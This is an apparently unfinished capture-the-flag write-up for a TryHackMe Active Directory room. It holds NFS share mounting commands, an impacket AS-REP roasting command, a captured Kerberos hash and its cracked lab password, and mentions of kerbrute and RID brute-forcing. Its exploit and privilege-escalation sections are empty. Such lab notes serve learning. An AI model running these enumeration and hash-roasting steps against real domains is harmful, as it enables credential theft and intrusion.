# Razorback Helped Through

Name: Razorback
Date:  /2022
Difficulty:  Medium
Description: These guys call themselves hackers. Can you show them who's the boss ??
Goals:  Chill out and have fun
Learnt:

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](TryHackMe/Markdown/Razorblack/Screenshots/ping.png)

![](rpcclientdeadend.png)

![](2049mountage.png)

![](filtered.png)

[Newbie Tuesday](https://www.youtube.com/watch?v=sdxdSWpzF-M&t=970s)

Question-along:
- What ports are important: 445, 88, 3369 389, 636 
- AD requires DNS and hostname is important for kerberos
- crackmapexec
- null authentication
- nfs is file sharing

```bash
sudo showmount -e $ip
sudo mkdir /mnt/rb
sudo mount HAVEN-DC:/users /mnt/rb # DNS and AD
sudo su # to be root the travverse driectory 
umount $ip:/local/file/path		
```

Into the beast the first flag is here
![](mounting.png)

Exflitrating the spreadsheets full of names
![1000](theemployees.png)
sbradley.txt is the naming convention ; ljudmila vetrova AD admin 

![](learningkerbrute.png)
Have not used kerbrute in awhile

Pre-Authenication disabled in kerberos is timestamp to dc encrypted by the password hash of the user.
```bash
impacket-GetNPUsers -dc-ip HAVEN-DC -usersfile validusers.txt -format john raz0rblack.thm/
```
![](asreproasting.png)
```
$krb5asrep$twilliams@RAZ0RBLACK.THM:f46ff33ba011644211541533d0586e15$8fe6da6fb859d20d1e256ca394b0cbeab33f395874093f51a34b15031a305f6801724ac6a2f78c50f6d26933a036afd204198d4eb8efb5eaf5fd47197e9896fde4bb61b453906bd3d62b31893fab8a39874a21c0eb6dcc17c7606c2a7ec433339b8682e3a894a77794a6baf833153918b51133ad6ee8158a855a03bf563574a181f0060ee8373c39de0d675504339066c186a5a73aec3295d0443925cc82e97d1c25b19f219dc2896366c7954b955225c931e2534d1fd28a0fc8aeaceb7540a808704f80474586cd62b2696092765eedb2304cbe3df8cb4b91900d1428c4a0af0285c9ce19c2749e42d4666c53fca9d9 

roastpotatoes
```


![](cmetw.png)

![](weirdness.png)

![](ridbrute.png)

xyan1d3 is not pre-auth




## Exploit

## Foothold

## PrivEsc

      
